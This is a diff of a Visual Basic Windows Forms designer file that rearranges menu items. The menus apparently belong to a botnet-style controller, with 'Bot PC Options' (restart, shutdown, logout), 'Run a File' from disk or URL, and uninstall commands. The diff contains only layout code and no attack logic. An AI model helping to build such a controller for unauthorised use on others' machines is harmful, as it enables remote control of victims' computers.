@@ -35,6 +35,7 @@ Partial Class Form1
         Me.RunAFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
+        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
         Me.ControllerOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.DiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
@@ -42,16 +43,15 @@ Partial Class Form1
         Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.BotPCOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.PCRestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.PCShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.PCLogoutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.BotColorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
         Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
         Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
-        Me.BotPCOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.PCRestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.PCShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.PCLogoutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
         Me.MAIN_TAB = New Server_0._4.CHTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
         Me.PictureBox1 = New System.Windows.Forms.PictureBox()
@@ -145,6 +145,11 @@ Partial Class Form1
         Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
         Me.FromURLToolStripMenuItem1.Text = "From URL"
         '
+        'ToolStripSeparator3
+        '
+        Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
+        Me.ToolStripSeparator3.Size = New System.Drawing.Size(218, 6)
+        '
         'ControllerOptionsToolStripMenuItem
         '
         Me.ControllerOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem, Me.CloseToolStripMenuItem, Me.UninstallToolStripMenuItem})
@@ -189,6 +194,31 @@ Partial Class Form1
         Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
         Me.UninstallToolStripMenuItem.Text = "Uninstall"
         '
+        'BotPCOptionsToolStripMenuItem
+        '
+        Me.BotPCOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PCRestartToolStripMenuItem, Me.PCShutdownToolStripMenuItem, Me.PCLogoutToolStripMenuItem})
+        Me.BotPCOptionsToolStripMenuItem.Name = "BotPCOptionsToolStripMenuItem"
+        Me.BotPCOptionsToolStripMenuItem.Size = New System.Drawing.Size(221, 30)
+        Me.BotPCOptionsToolStripMenuItem.Text = "Bot PC Options"
+        '
+        'PCRestartToolStripMenuItem
+        '
+        Me.PCRestartToolStripMenuItem.Name = "PCRestartToolStripMenuItem"
+        Me.PCRestartToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
+        Me.PCRestartToolStripMenuItem.Text = "PC Restart"
+        '
+        'PCShutdownToolStripMenuItem
+        '
+        Me.PCShutdownToolStripMenuItem.Name = "PCShutdownToolStripMenuItem"
+        Me.PCShutdownToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
+        Me.PCShutdownToolStripMenuItem.Text = "PC Shutdown"
+        '
+        'PCLogoutToolStripMenuItem
+        '
+        Me.PCLogoutToolStripMenuItem.Name = "PCLogoutToolStripMenuItem"
+        Me.PCLogoutToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
+        Me.PCLogoutToolStripMenuItem.Text = "PC Logout"
+        '
         'BotColorToolStripMenuItem
         '
         Me.BotColorToolStripMenuItem.Name = "BotColorToolStripMenuItem"
@@ -215,36 +245,6 @@ Partial Class Form1
         Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
         Me.NotifyIcon1.Text = "NotifyIcon1"
         Me.NotifyIcon1.Visible = True
-        '
-        'BotPCOptionsToolStripMenuItem
-        '
-        Me.BotPCOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PCRestartToolStripMenuItem, Me.PCShutdownToolStripMenuItem, Me.PCLogoutToolStripMenuItem})
-        Me.BotPCOptionsToolStripMenuItem.Name = "BotPCOptionsToolStripMenuItem"
-        Me.BotPCOptionsToolStripMenuItem.Size = New System.Drawing.Size(221, 30)
-        Me.BotPCOptionsToolStripMenuItem.Text = "Bot PC Options"
-        '
-        'PCRestartToolStripMenuItem
-        '
-        Me.PCRestartToolStripMenuItem.Name = "PCRestartToolStripMenuItem"
-        Me.PCRestartToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
-        Me.PCRestartToolStripMenuItem.Text = "PC Restart"
-        '
-        'PCShutdownToolStripMenuItem
-        '
-        Me.PCShutdownToolStripMenuItem.Name = "PCShutdownToolStripMenuItem"
-        Me.PCShutdownToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
-        Me.PCShutdownToolStripMenuItem.Text = "PC Shutdown"
-        '
-        'PCLogoutToolStripMenuItem
-        '
-        Me.PCLogoutToolStripMenuItem.Name = "PCLogoutToolStripMenuItem"
-        Me.PCLogoutToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
-        Me.PCLogoutToolStripMenuItem.Text = "PC Logout"
-        '
-        'ToolStripSeparator3
-        '
-        Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
-        Me.ToolStripSeparator3.Size = New System.Drawing.Size(218, 6)
         '
         'MAIN_TAB
         '
